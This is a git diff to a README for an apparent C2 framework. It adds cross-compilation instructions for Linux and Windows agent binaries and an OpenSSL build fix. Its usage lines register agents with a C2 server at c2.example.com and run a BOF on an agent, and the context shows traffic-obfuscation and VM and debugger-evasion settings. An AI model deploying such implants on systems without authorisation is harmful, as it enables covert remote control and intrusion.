@@ -163,11 +163,11 @@ cargo build --release
 cargo build --release --bin nexus-infra
 cargo build --release --bin nexus-server
 
-# Build Linux Agent
-cargo build --release --bin nexus-agent --config ./config/agent-linux.toml
+# Build Linux Agent (native or cross-compilation)
+cargo build --release --bin nexus-agent-linux
 
-# Build Windows Agent
-cargo build --release --bin nexus-agent --config ./config/agent-windows.toml
+# Build Windows Agent (cross-compilation from Linux)
+cargo build --release --bin nexus-agent-windows --target x86_64-pc-windows-gnu
 
 ### 3. **Deploy Infrastructure**
 
@@ -219,13 +219,73 @@ traffic_obfuscation = true
 anti_analysis = { vm_detection = true, debugger_detection = true }
 ```
 
+## 🔧 Cross-Platform Building
+
+### **Prerequisites for Cross-Compilation**
+
+```bash
+# Install Windows cross-compilation target
+rustup target add x86_64-pc-windows-gnu
+
+# Install additional targets (optional)
+rustup target add x86_64-unknown-linux-gnu   # Linux from other platforms
+rustup target add aarch64-unknown-linux-gnu  # ARM64 Linux
+```
+
+### **Platform-Specific Binary Builds**
+
+#### **Linux Agents**
+```bash
+# Native Linux build
+cargo build --release --bin nexus-agent-linux
+
+# Output location: target/release/nexus-agent-linux
+```
+
+#### **Windows Agents (Cross-compilation)**
+```bash
+# Windows cross-compilation from Linux/macOS
+cargo build --release --bin nexus-agent-windows --target x86_64-pc-windows-gnu
+
+# Output location: target/x86_64-pc-windows-gnu/release/nexus-agent-windows.exe
+```
+
+### **OpenSSL Cross-Compilation Fix**
+
+The framework includes vendored OpenSSL to resolve cross-compilation issues:
+
+**✅ What's Fixed:**
+- Windows cross-compilation works without external OpenSSL dependencies
+- Static linking eliminates runtime dependency requirements
+- Consistent builds across all platforms
+
+**⚠️ If you encounter OpenSSL errors during cross-compilation:**
+```bash
+# Error example:
+# error: failed to run custom build command for `openssl-sys v0.9.109`
+
+# This is already fixed in the current version via vendored OpenSSL
+# Ensure you're using the latest version from the repository
+```
+
+### **Binary Output Locations**
+
+| Platform | Build Command | Output Location |
+|----------|---------------|-----------------|
+| Linux (native) | `cargo build --release --bin nexus-agent-linux` | `target/release/nexus-agent-linux` |
+| Windows (cross) | `cargo build --release --bin nexus-agent-windows --target x86_64-pc-windows-gnu` | `target/x86_64-pc-windows-gnu/release/nexus-agent-windows.exe` |
+| Server | `cargo build --release --bin nexus-server` | `target/release/nexus-server` |
+
 ## 🎯 Advanced Usage
 
 ### **gRPC Communication**
 
 ```bash
-# Register agent with gRPC server
-./nexus-agent --grpc-endpoint https://c2.example.com:443
+# Register Linux agent with gRPC server
+./target/release/nexus-agent-linux --grpc-endpoint https://c2.example.com:443
+
+# Register Windows agent (on Windows system)
+.\target\x86_64-pc-windows-gnu\release\nexus-agent-windows.exe --grpc-endpoint https://c2.example.com:443
 
 # Execute BOF with arguments
 nexus-cli bof-execute agent-123 "whoami.obj" "go"
